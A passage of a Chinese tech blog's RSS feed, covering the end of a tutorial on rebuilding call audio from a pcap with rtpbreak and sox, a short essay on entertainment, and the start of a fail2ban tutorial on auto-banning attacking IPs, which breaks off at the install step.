&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   Lost RTP packets: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0.00&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#a6e22e&#34;&gt;Noise&lt;/span&gt; (false positive) packets: &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; No active RTP streams
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 7. 查看输出文件
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rw&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;. &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;185&lt;/span&gt;K May  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;09&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt; krk9hprvin1u1laqe14g&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;beffe8aaeb9bf99.pcap
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rw&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;. &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;132&lt;/span&gt;K May  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;09&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt; rtp&lt;span style=&#34;color:#ae81ff&#34;&gt;.0.0&lt;/span&gt;.pcap
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rw&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;. &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root  &lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt;K May  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;09&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt; rtp&lt;span style=&#34;color:#ae81ff&#34;&gt;.0.0&lt;/span&gt;.raw
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rw&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;. &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root  &lt;span style=&#34;color:#ae81ff&#34;&gt;412&lt;/span&gt; May  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;09&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt; rtp&lt;span style=&#34;color:#ae81ff&#34;&gt;.0.0&lt;/span&gt;.txt
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rw&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;. &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root  &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;K May  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;09&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt; rtp&lt;span style=&#34;color:#ae81ff&#34;&gt;.0.1&lt;/span&gt;.pcap
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rw&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;. &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root  &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;K May  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;09&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt; rtp&lt;span style=&#34;color:#ae81ff&#34;&gt;.0.1&lt;/span&gt;.raw
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rw&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;. &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root  &lt;span style=&#34;color:#ae81ff&#34;&gt;435&lt;/span&gt; May  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;09&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt; rtp&lt;span style=&#34;color:#ae81ff&#34;&gt;.0.1&lt;/span&gt;.txt
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rw&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;. &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;1.7&lt;/span&gt;K May  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;09&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt; rtp&lt;span style=&#34;color:#ae81ff&#34;&gt;.0&lt;/span&gt;.txt
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 8. 使用sox 转码以及合成wav文件
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;sox &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;r8000 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;c1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;t ul rtp&lt;span style=&#34;color:#ae81ff&#34;&gt;.0.0&lt;/span&gt;.raw &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;t wav &lt;span style=&#34;color:#ae81ff&#34;&gt;0.&lt;/span&gt;wav
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sox &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;r8000 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;c1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;t ul rtp&lt;span style=&#34;color:#ae81ff&#34;&gt;.0.1&lt;/span&gt;.raw &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;t wav &lt;span style=&#34;color:#ae81ff&#34;&gt;1.&lt;/span&gt;wav
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sox &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;m &lt;span style=&#34;color:#ae81ff&#34;&gt;0.&lt;/span&gt;wav &lt;span style=&#34;color:#ae81ff&#34;&gt;1.&lt;/span&gt;wav call.wav
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 最终合成的 call.wav文件，就是可以放到浏览器中播放的双声道语音文件
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;h2 id=&#34;rtpbreak帮助文档&#34;&gt;rtpbreak帮助文档&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Copyright&lt;/span&gt; (c) &lt;span style=&#34;color:#ae81ff&#34;&gt;2007&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2008&lt;/span&gt; Dallachiesa Michele &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;micheleDOTdallachiesaATposteDOTit&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rtpbreak v1&lt;span style=&#34;color:#ae81ff&#34;&gt;.3&lt;/span&gt;a is free software, covered by the GNU General Public License.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;USAGE: &lt;span style=&#34;color:#a6e22e&#34;&gt;rtpbreak&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;|-&lt;/span&gt;i) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;source&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; [options]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; INPUT
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;r &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;str&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;      Read packets from pcap file &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;str&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;str&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;      Read packets from network interface &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;str&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;L &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;      Force datalink header length &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; bytes
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; OUTPUT
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;d &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;str&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;      Set output directory to &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;str&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; (def:.)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;w            Disable RTP raw dumps
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;W            Disable RTP pcap dumps
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;g            Fill gaps in RTP raw &lt;span style=&#34;color:#a6e22e&#34;&gt;dumps&lt;/span&gt; (caused by lost packets)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;n            Dump noise packets
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;f            Disable stdout logging
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;F            Enable syslog logging
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;v            Be verbose
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; SELECT
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;m            Sniff packets in promisc mode
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;str&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;      Add pcap filter &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;str&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;e            Expect even destination UDP port
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;u            Expect unprivileged source&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;destination UDP &lt;span style=&#34;color:#a6e22e&#34;&gt;ports&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;y &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;      Expect RTP payload type &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;l &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;      Expect RTP payload length &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; bytes
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;t &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;float&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;    Set packet timeout to &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;float&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;seconds&lt;/span&gt; (def:&lt;span style=&#34;color:#ae81ff&#34;&gt;10.00&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;T &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;float&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;    Set pattern timeout to &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;float&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;seconds&lt;/span&gt; (def:&lt;span style=&#34;color:#ae81ff&#34;&gt;0.25&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;P &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;      Set pattern packets count to &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; (def:&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; EXECUTION
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Z &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;str&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;      Run as user &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;str&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;D            Run in &lt;span style=&#34;color:#a6e22e&#34;&gt;background&lt;/span&gt; (option &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;f implicit)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; MISC
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;k            List known RTP payload types
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;h            This
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>娱乐智障</title>
      <link>https://wdd.js.org/posts/2020/04/uffptn/</link>
      <pubDate>Tue, 28 Apr 2020 21:56:52 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/04/uffptn/</guid>
      <description>&lt;p&gt;娱乐至死，娱乐也能让人变得智障。&lt;/p&gt;
&lt;p&gt;贪图于精神愉悦，在永无休止的欢悦中难以自拔。&lt;/p&gt;
&lt;p&gt;道德经上写道：五色令人目盲，五音令人耳聋，五味令人口爽，驰骋田猎令人心发狂。&lt;/p&gt;
&lt;p&gt;现代人尤其如此。买分辨率最高的显示器，刷新频率最高的手机，买最贵的耳机，吃口味最为劲爆的火锅。&lt;/p&gt;
&lt;p&gt;感觉人都已经被五官所控制，变成了一个行尸走肉的躯壳。&lt;/p&gt;
&lt;p&gt;但是话又说回来，人为什么要这要麻痹自己呢？&lt;/p&gt;
&lt;p&gt;或许变成一个智障，才能稍微从现实的夹缝中稍微缓口气。&lt;/p&gt;
&lt;p&gt;冷风如刀，以大地为砧板，视众生皆为鱼肉。&lt;/p&gt;</description>
    </item>
    <item>
      <title>自动IP拦截工具fail2ban使用教程</title>
      <link>https://wdd.js.org/posts/2020/04/ih9pz2/</link>
      <pubDate>Tue, 28 Apr 2020 08:48:11 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/04/ih9pz2/</guid>
      <description>&lt;h1 id=&#34;简介&#34;&gt;简介&lt;/h1&gt;
&lt;p&gt;如果你的主机在公网上有端口暴露出去，那么总会有一些不怀好意的家伙，会尝试通过各种方式攻击你的机器。常见的服务例如ssh, nginx都会有类似的威胁。&lt;/p&gt;
&lt;p&gt;手工将某个ip加入黑名单，这种操作太麻烦，而且效率低。而fail2ban就是一种自动化的解决方案。&lt;/p&gt;
&lt;h1 id=&#34;fail2ban工作原理&#34;&gt;fail2ban工作原理&lt;/h1&gt;
&lt;p&gt;fail2ban的工作原理是监控某个日志文件，然后根据某些关键词，提取出攻击方的IP地址，然后将其加入到黑名单。&lt;/p&gt;
&lt;h1 id=&#34;fail2ban安装&#34;&gt;fail2ban安装&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;yum&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;install&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fail2ban&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;y&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;如果找不到fail2ban包&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;，&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;就执行下面的命令&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;yum&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;install&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;epel&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;release&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
